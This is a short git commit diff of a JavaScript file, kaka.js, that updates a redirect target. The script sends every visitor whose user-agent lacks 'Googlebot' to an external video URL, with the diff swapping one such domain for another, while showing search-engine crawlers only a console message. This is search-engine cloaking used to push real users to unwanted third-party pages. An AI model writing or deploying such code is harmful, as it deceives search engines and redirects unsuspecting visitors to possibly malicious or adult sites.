dd1eb426d0459587190bb89dbdb62c87590bb015
lamne07-hash <asifonline564@gmail.com>
2026-09-20 03:54:37 +0600

    Update kaka.js

--- kaka.js
+++ kaka.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://videonsfw.com/vod/?asf";
+  window.location.href = "https://sites.elastichq.org/video/?asf";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
